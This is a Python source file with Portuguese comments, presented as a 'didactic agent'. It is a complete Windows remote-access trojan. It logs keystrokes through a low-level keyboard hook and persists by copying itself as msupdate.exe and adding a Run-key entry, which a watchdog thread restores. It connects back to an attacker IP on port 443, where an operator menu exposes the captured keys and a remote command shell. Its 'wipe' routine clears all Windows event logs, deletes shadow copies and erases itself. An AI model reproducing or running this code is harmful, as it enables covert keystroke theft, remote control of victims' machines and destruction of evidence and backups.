#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Agente didático – persistência, keylogger, limpeza extrema
VERSÃO FINAL: wipe + suicídio + desligamento total
"""

# ---------- IMPORTAÇÕES ---------- #
# Biblioteca padrão: tudo o que precisamos sem instalar nada externo
from time import sleep                 # delays e loops de espera
import subprocess, socket, os, threading, sys, ctypes, ctypes.wintypes, winreg, shutil, signal
from pathlib import Path               # caminhos de arquivo mais elegantes
from ctypes import windll              # acesso direto à API do Windows
from datetime import datetime as dt      # carimbo de data/hora nos logs

# ---------- CONFIGURAÇÕES GLOBAIS ---------- #
IP        = "192.168.1.80"     # IP do atacante (máquina com netcat)
PORT      = 443                  # porta que o atacante escuta
LOG_FILE  = os.path.join(os.getenv("APPDATA"), "svchost.log")  # esconde log dentro de %APPDATA%
MUTEX     = "Global\\msupdate42" # nome do mutex que impede 2 cópias simultâneas
BUF       = ""                   # buffer global que acumula teclas capturadas
LOCK      = threading.Lock()    # cadeado para BUF não ser escrito por 2 threads ao mesmo tempo
RETRY_CUR = 1                    # segundo(s) antes de tentar reconectar (back-off exponencial)
DEBUG     = False                # flag para imprimir informações extras (não usada aqui)
XOR_KEY   = 0x9F                # chave simples para "ofuscar" o texto digitado
EXE_PATH  = os.path.join(os.getenv("APPDATA"), "msupdate.exe")  # onde ficará o binário cópia
WIPE_FLAG = False               # quando True, o processo vai se matar após limpeza

# ---------- FUNÇÃO SIMPLES DE CIFRA ---------- #
# XOR byte a byte: não é seguro, mas quebra olho grosseiro
def _xor(texto_claro: str) -> str:
    return "".join([chr(ord(c) ^ XOR_KEY) for c in texto_claro])

# ---------- FUNÇÃO DE LOG ---------- #
# Escreve mensagens em LOG_FILE com data/hora; silencia se falhar
def log(msg: str) -> None:
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as fh:
            # Formato curto: dia/mês hora:minuto
            fh.write(f"[{dt.now():%d/%m %H:%M:%S}] {msg}\n")
    except Exception:
        pass  # não queremos que um erro de log quebre o programa

# ---------- CONSTANTES DO KEYLOGGER (HOOK de teclado) ---------- #
WH_KEYBOARD_LL   = 13             # tipo de hook para teclado de baixo nível
WM_KEYDOWN       = 0x0100         # mensagem Windows: tecla pressionada
WM_SYSKEYDOWN    = 0x0104         # mesma coisa, mas para teclas do sistema
HOOKPROCTYPE     = ctypes.WINFUNCTYPE(ctypes.c_uint, ctypes.c_uint, ctypes.c_uint, ctypes.c_void_p)
hook_id          = None           # identificador do hook (global)

# ---------- FUNÇÃO QUE RECEBE CADA TECLA ---------- #
def low_level_handler(nCode, wParam, lParam):
    """
    Chamada pelo Windows toda vez que uma tecla é pressionada.
    nCode: se >= 0 processamos; se < 0 passamos adiante.
    wParam: WM_KEYDOWN ou WM_SYSKEYDOWN
    lParam: ponteiro com informações da tecla
    """
    if wParam in (WM_KEYDOWN, WM_SYSKEYDOWN) and nCode >= 0:
        # Extrai o código virtual da tecla
        vk = lParam[0] & 0xFF
        # Converte para caractere legível (ou simula)
        mapped = windll.user32.MapVirtualKeyA(vk, 2)
        char = ""
        if 32 <= mapped <= 126:       # caracteres visíveis
            char = chr(mapped)
            shift = windll.user32.GetKeyState(0x10) & 0x8000
            caps  = windll.user32.GetKeyState(0x14) & 1
            if shift ^ caps and char.isalpha():
                char = char.upper()
        elif vk == 13:  char = "\n"   # Enter
        elif vk == 9:   char = "\t"   # Tab
        elif vk == 8:   char = "[BS]"  # Backspace
        if char:
            global BUF
            with LOCK:
                BUF += _xor(char)
                # Limita o buffer para não crescer eternamente
                if len(BUF) > 65536:
                    BUF = BUF[-65536:]
    # Passa a mensagem para o próximo hook (se houver)
    return windll.user32.CallNextHookEx(hook_id, nCode, wParam, lParam)

# ---------- INSTALA O HOOK E RODA LOOP DE MENSAGENS ---------- #
def start_keylogger():
    global hook_id
    # Instala o hook no contexto da thread atual
    hook_id = windll.user32.SetWindowsHookExA(
        WH_KEYBOARD_LL,
        HOOKPROCTYPE(low_level_handler),
        windll.kernel32.GetModuleHandleA(None),
        0
    )
    # Loop de mensagens Windows (obrigatório para o hook funcionar)
    msg = ctypes.wintypes.MSG()
    while windll.user32.GetMessageA(ctypes.byref(msg), 0, 0, 0) != 0:
        pass

# ---------- PERSISTÊNCIA NO REGISTRO + CÓPIA DO BINÁRIO ---------- #
def persist() -> None:
    """
    Copia o interpretador Python (ou o py compilado) para %APPDATA%\msupdate.exe
    e registra essa cópia na chave HKCU\Software\Microsoft\Windows\CurrentVersion\Run
    para executar na inicialização do usuário.
    """
    if not os.path.exists(EXE_PATH):
        # sys.executable é o python.exe que está rodando; copia para o disco
        shutil.copy2(sys.executable, EXE_PATH)
    with winreg.CreateKey(winreg.HKEY_CURRENT_USER,
                          r"Software\Microsoft\Windows\CurrentVersion\Run") as k:
        winreg.SetValueEx(k, "msupdate", 0, winreg.REG_SZ, EXE_PATH)

# ---------- "GUARDIÃO" DA PERSISTÊNCIA ---------- #
def persist_guardian() -> None:
    """
    Thread que dorme 60 s e verifica se a chave 'msupdate' ainda existe.
    Se alguém apagou, recria.
    """
    while True:
        sleep(60)
        try:
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                r"Software\Microsoft\Windows\CurrentVersion\Run") as k:
                val, _ = winreg.QueryValueEx(k, "msupdate")
        except OSError:
            val = None
        if val != EXE_PATH:
            persist()

# ---------- LIMPEZA DE RASTROS ---------- #
def overwrite_then_unlink(path: str | Path) -> None:
    """
    Sobrescreve o arquivo inteiro com bytes nulos e depois o apaga.
    Isso impede recuperação superficial em disco.
    """
    p = Path(path)
    if not p.exists():
        return
    try:
        sz = p.stat().st_size
        with p.open("r+b") as fh:
            fh.write(b"\x00" * sz)
        p.unlink()
    except Exception:
        pass

def cleanup_hardcore() -> None:
    """
    1) Sobrescreve e apaga EXE_PATH (msupdate.exe)
    2) Sobrescreve e apaga LOG_FILE
    3) Remove a chave 'msupdate' do registro
    4) Limpa logs do Windows Event Viewer
    5) Tenta apagar shadows com vshadow (silencia erros)
    """
    overwrite_then_unlink(EXE_PATH)
    overwrite_then_unlink(LOG_FILE)
    try:
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                            r"Software\Microsoft\Windows\CurrentVersion\Run",
                            0, winreg.KEY_ALL_ACCESS) as k:
            winreg.DeleteValue(k, "msupdate")
    except Exception:
        pass
    # Apaga todos os logs de evento que tenham registros (evita poluir)
    ps = 'Get-WinEvent -ListLog * | Where-Object {$_.RecordCount -gt 0} | ForEach-Object { wevtutil cl $_.LogName }'
    subprocess.run(["powershell", "-NoProfile", "-Command", ps], capture_output=True)
    # vshadow -da remove cópias shadow (backup) existentes; silencia falhas
    subprocess.run(["vshadow", "-da"], shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

# ---------- FUNÇÃO DE SUICÍDIO ---------- #
def suicide(delay: int = 3) -> None:
    """
    1) Aguarda <delay> segundos para o atacante ver a mensagem
    2) Sobrescreve/apaga o próprio arquivo fonte
    3) Envia sinal SIGTERM ao próprio processo (encerra Python e todas as threads)
    """
    sleep(delay)
    try:
        overwrite_then_unlink(__file__)
    except Exception:
        pass
    os.kill(os.getpid(), signal.SIGTERM)

# ---------- MENU EXIBIDO PARA O ATACANTE ---------- #
def show_menu(s: socket.socket) -> None:
    menu = """
===④ Painel de Controle ===①
1 — Visualizar teclas capturadas (keys)
2 — Executar comando CMD
3 — Status de persistência
4 — LIMPAR TUDO (wipe/die) /SEM RASTRO/
5 — Sair
Escolha (1-5): """
    s.send(menu.encode())

# ---------- PROCESSA COMANDOS DO ATACANTE ---------- #
def handle_command(s: socket.socket, cmd: str) -> bool:
    """
    Retorna True  = continue no loop de menu
            False = finalize conexão (pode ser apenas "voltar" ou suicídio)
    """
    global WIPE_FLAG
    cmd = cmd.strip()

    # 1) Mostra últimas teclas capturadas
    if cmd == "1":
        global BUF
        with LOCK:
            chunk = BUF[-2048:]
        s.send(b"--- KEYS (xor 0x%02X) ---\n%s\n--- FIM ---\n" % (XOR_KEY, chunk.encode()))
        return True

    # 2) Executa comando CMD remoto
    elif cmd == "2":
        s.send(b"CMD> ")
        cmd_line = s.recv(4096).decode().strip()
        if not cmd_line:
            return True
        try:
            # timeout evita travar para sempre
            out = subprocess.check_output(cmd_line, shell=True, stderr=subprocess.STDOUT, timeout=15)
            s.send(out + b"\n")
        except subprocess.TimeoutExpired:
            s.send(b"TIMEOUT (15 s)\n")
        except Exception as e:
            s.send(f"ERRO: {e}\n".encode())
        return True

    # 3) Exibe informações de persistência
    elif cmd == "3":
        info = (f"Executavel: {EXE_PATH}\n"
                "Registry : HKCU\\Run\\msupdate\n"
                f"Log local : {LOG_FILE}\n"
                f"PID atual : {os.getpid()}\n")
        s.send(info.encode())
        return True

    # 4) LIMPEZA TOTAL + SUICÍDIO
    elif cmd in ("4", "/wipe", "/die", "exit"):
        s.send(b"[+] Wipe + shutdown self in 3 s...\n")
        cleanup_hardcore()
        s.close()                      # libera socket antes de morrer
        WIPE_FLAG = True
        # inicia thread que se mata depois de 3 s
        threading.Thread(target=lambda: suicide(3), daemon=True).start()
        return False                   # sai do loop de menu
    else:
        s.send(b"[!] Opcao invalida\n")
        return True

# ---------- TENTA CONECTAR AO C&C (BACK-OFF EXPONENCIAL) ---------- #
def connect_back() -> socket.socket:
    """
    Loop infinito até conseguir socket válido; usa RETRY_CUR global.
    Retorna socket já conectado ou levanta exceção (capturada em main_loop).
    """
    global RETRY_CUR
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(10)
            s.connect((IP, PORT))
            RETRY_CUR = 1              # reset no sucesso
            return s
        except (socket.timeout, ConnectionRefusedError, OSError):
            log(f"Conexão falhou, re-tentando em {RETRY_CUR}s")
            sleep(RETRY_CUR)
            RETRY_CUR = min(RETRY_CUR * 2, 1800)  # limita em 30 min

# ---------- LOOP PRINCIPAL: CONECTA → MENU → RECONECTA ---------- #
def main_loop() -> None:
    global WIPE_FLAG
    while True:
        if WIPE_FLAG:              # se wipe foi disparado, mata processo
            suicide(0)
            break
        sock = connect_back()
        log("Conectado ao C&C")
        try:
            while True:
                show_menu(sock)
                data = sock.recv(1024).decode(errors="ignore").strip()
                if not data:       # cliente fechou ou erro
                    break
                if not handle_command(sock, data):
                    break
        except (socket.error, ConnectionResetError):
            pass
        finally:
            try:
                sock.close()
            except Exception:
                pass
            log("Desconectado do C&C – reconectando…")

# ---------- PONTO DE ENTRADA DO PROGRAMA ---------- #
if __name__ == "__main__":
    # SINGLETON: evita que duas cópias do agente rodem simultaneamente
    mutex = windll.kernel32.CreateMutexA(None, 1, MUTEX)
    if windll.kernel32.GetLastError() == 0xB7:  # ERROR_ALREADY_EXISTS
        sys.exit()                              # já tem outra instância

    persist()                               # garante cópia e registro
    threading.Thread(target=persist_guardian, daemon=True).start()  # vigilante da persistência
    threading.Thread(target=start_keylogger, daemon=True).start()  # captura de teclas
    main_loop()                             # entra no ciclo conectar/menu/reconectar
